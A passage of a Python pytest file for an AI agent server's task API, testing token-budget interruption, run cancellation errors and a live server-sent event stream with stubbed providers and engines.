        class _P(OpenAICompatibleProvider):
            def __init__(self): pass
        monkeypatch.setattr(agent_v1, "_build_provider", lambda name: _P())
        stub = self._budget_stub_engine(n_tool_calls=3)
        import ppxai.engine.client as client_mod
        monkeypatch.setattr(client_mod, "EngineClient", lambda: stub)

        resp = c.post("/v1/agent/task", json={
            "task": "loop", "tools": ["read_file"], "provider": "p", "model": "m",
        })
        rid = resp.json()["run_id"]
        one = self._poll_terminal(c, rid)
        assert one["status"] == "completed"
        assert one["resumable"] is False

    def test_task_token_budget_interrupts(self, client, monkeypatch):
        # Inc 6 (codex MEDIUM fix): the token budget must be ENFORCED from the
        # run's real usage, not just exposed. This stub grows
        # session.usage.total_tokens by 40 per tool call; with a 100-token
        # budget the run must interrupt once the cumulative total hits the cap
        # (after iter 3: 0,40,80 ok -> 120 >= 100 stops).
        c, _reg = client
        from ppxai.server.routes import agent_v1
        from ppxai.engine.types import Event, EventType
        from ppxai.engine.providers.openai_compat import OpenAICompatibleProvider

        class _P(OpenAICompatibleProvider):
            def __init__(self): pass
        monkeypatch.setattr(agent_v1, "_build_provider", lambda name: _P())

        class _Usage:
            def __init__(self): self.total_tokens = 0
        class _Session:
            def __init__(self): self.usage = _Usage()
        class _BaseTM:
            max_iterations = 99
            async def execute_tool(self, name, **kw): return "ran"

        class _TokenStub:
            def __init__(self):
                self.tool_manager = _BaseTM()
                self.session = _Session()
            def set_provider(self, p): pass
            def set_model(self, m): pass
            def enable_tools(self): pass
            async def chat(self, task, stream=False):
                for _ in range(10):
                    # tokens accrue BEFORE the boundary check reads them
                    self.session.usage.total_tokens += 40
                    yield Event(type=EventType.TOOL_CALL, data={"tool": "read_file"})
                yield Event(type=EventType.STREAM_END, data="done")

        stub = _TokenStub()
        import ppxai.engine.client as client_mod
        monkeypatch.setattr(client_mod, "EngineClient", lambda: stub)

        resp = c.post("/v1/agent/task", json={
            "task": "burn tokens", "tools": ["read_file"],
            "provider": "p", "model": "m",
            "budget": {"tokens": 100},
        })
        rid = resp.json()["run_id"]
        one = self._poll_terminal(c, rid)
        assert one["status"] == "interrupted"   # token cap actually stopped it
        assert one["resumable"] is True
        assert one["budget"] == {"tokens": 100}
        # stopped well before the stub's 10 iterations
        tool_evs = c.get(f"/v1/agent/runs/{rid}/events?category=tool").json()["events"]
        assert 0 < len([e for e in tool_evs if e["type"] == "tool_call"]) < 10

    def test_cancel_unknown_run_404(self, client):
        c, _ = client
        assert c.post("/v1/agent/runs/run_nope/cancel").status_code == 404

    def test_cancel_terminal_run_409(self, client):
        # a finished run can't be cancelled
        c, reg = client
        m = reg.start_run(task="t", tools=["read_file"], provider="p", model="m")
        reg.finish_run(m, status="completed", result="x")
        r = c.post(f"/v1/agent/runs/{m.run_id}/cancel")
        assert r.status_code == 409
        assert "not cancellable" in r.json()["detail"]

    @pytest.mark.asyncio
    async def test_events_live_sse_path(self, client):
        # Inc 3 LOW (codex): exercise the actual ?live=1 SSE generator
        # end-to-end — backlog replay, live event via the queue,
        # overflow self-heal from disk, keepalive, and disconnect cleanup.
        #
        # We drive the route's StreamingResponse body iterator directly
        # rather than via TestClient: the SSE generator is intentionally
        # infinite (keepalive loop), which makes TestClient's stream
        # teardown block. Driving the iterator lets us assert the real
        # logic AND control disconnect deterministically.
        import asyncio
        from ppxai.server.routes import agent_v1

        c, reg = client
        m = reg.start_run("t", provider="p", model="m")
        reg.emit_event(m.run_id, "backlog1", level="info", category="lifecycle")

        # Controllable disconnect: request.is_disconnected() flips when we say.
        disconnected = {"v": False}

        class _Req:
            async def is_disconnected(self):
                return disconnected["v"]

        resp = await agent_v1.get_agent_run_events(
            run_id=m.run_id, request=_Req(), since=0, live=True,
            min_level="debug", category=None,
        )
        body = resp.body_iterator
        frames = []

        async def _next_data(timeout=2.0):
            # pull frames until the next data: line (skip keepalives)
            while True:
                chunk = await asyncio.wait_for(body.__anext__(), timeout)
                if chunk.startswith("data: "):
                    return json.loads(chunk[6:])

        # 1. backlog replays as an SSE data frame
        frames.append(await _next_data())
        # 2. a live event arrives via the queue
        reg.emit_event(m.run_id, "live1", level="warning", category="network")
        frames.append(await _next_data())
        # 3. overflow self-heal: fill the queue so emit flags it, then the
        #    generator should replay the missed events from disk.
        q = next(iter(reg._subscribers[m.run_id]))
        for i in range(q.maxsize + 3):
            reg.emit_event(m.run_id, f"flood{i}", level="info", category="tool")
        healed = await _next_data(timeout=3.0)
        frames.append(healed)

        types = [f["type"] for f in frames]
        assert types[0] == "backlog1"          # backlog replayed
        assert types[1] == "live1"             # live via queue
        assert types[2].startswith("flood")    # self-healed from disk after overflow
        seqs = [f["seq"] for f in frames]
        assert seqs == sorted(seqs) and len(set(seqs)) == len(seqs)  # ordered, no dup

        # 4. keepalive: with nothing emitted and not disconnected, the gen
        #    yields a comment frame on timeout (we don't wait the full 15s;
        #    just assert disconnect cleanly ends the generator).
        disconnected["v"] = True
        with pytest.raises(StopAsyncIteration):
            # drain any buffered frames, then the loop sees disconnect → ends
            for _ in range(q.maxsize + 10):
                await asyncio.wait_for(body.__anext__(), 2.0)
        # generator exhausted → its finally ran → subscriber removed
        assert m.run_id not in reg._subscribers or q not in reg._subscribers.get(m.run_id, set())
